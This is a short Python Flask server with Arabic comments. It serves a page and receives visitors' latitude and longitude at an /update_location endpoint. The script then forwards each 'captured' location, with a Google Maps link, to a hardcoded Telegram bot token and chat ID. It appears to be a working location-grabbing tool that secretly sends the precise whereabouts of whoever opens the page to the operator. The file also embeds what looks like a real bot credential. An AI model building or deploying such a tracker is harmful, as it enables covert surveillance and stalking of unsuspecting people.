from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

# ضع هنا بيانات بوت تليجرام الخاص بك
TELEGRAM_TOKEN ='8623645246:AAFb6J_WzeklBuiUZ343euFnVxXPDNm9z0o'
CHAT_ID = '1763745422'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/update_location', methods=['POST'])
def update_location():
    data = request.json
    lat = data.get('lat')
    lon = data.get('lon')
    
    # إرسال البيانات لتليجرام
    message = f"🚨 موقع جديد تم التقاطه:\n📍 خط العرض: {lat}\n📍 خط الطول: {lon}\n🔗 الرابط: https://maps.google.com/?q={lat},{lon}"
    
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    params = {'chat_id': CHAT_ID, 'text': message}
    requests.get(url, params=params)
    
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(port=8080)
